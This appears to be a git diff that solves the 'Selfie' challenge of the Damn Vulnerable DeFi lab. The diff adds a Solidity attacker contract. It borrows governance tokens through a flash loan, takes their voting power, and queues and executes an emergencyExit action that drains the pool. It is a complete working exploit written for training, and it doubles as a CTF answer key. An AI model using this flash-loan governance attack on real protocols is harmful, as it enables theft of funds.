@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttacker attacker = new SelfieAttacker(pool, governance, token);
+        attacker.attack(TOKENS_IN_POOL);
+        vm.warp(block.timestamp + 2 days);
+        attacker.executeAction(recovery);
     }
 
     /**
@@ -71,6 +75,58 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract SelfieAttacker is IERC3156FlashBorrower {
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+    DamnValuableVotes private token;
+    uint256 private actionId;
+
+    constructor(
+        SelfiePool _pool,
+        SimpleGovernance _governance,
+        DamnValuableVotes _token
+    ) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+    }
+
+    function attack(uint256 amount) external {
+        pool.flashLoan(this, address(token), amount, bytes(""));
+    }
+
+    function onFlashLoan(
+        address,
+        address _token,
+        uint256 amount,
+        uint256,
+        bytes calldata
+    ) external returns (bytes32) {
+        // Delegate to self to get voting power
+        token.delegate(address(this));
+
+        // Queue governance action to drain the pool
+        actionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeCall(pool.emergencyExit, (address(this)))
+        );
+
+        // Approve repayment
+        token.approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction(address recovery) external {
+        governance.executeAction(actionId);
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
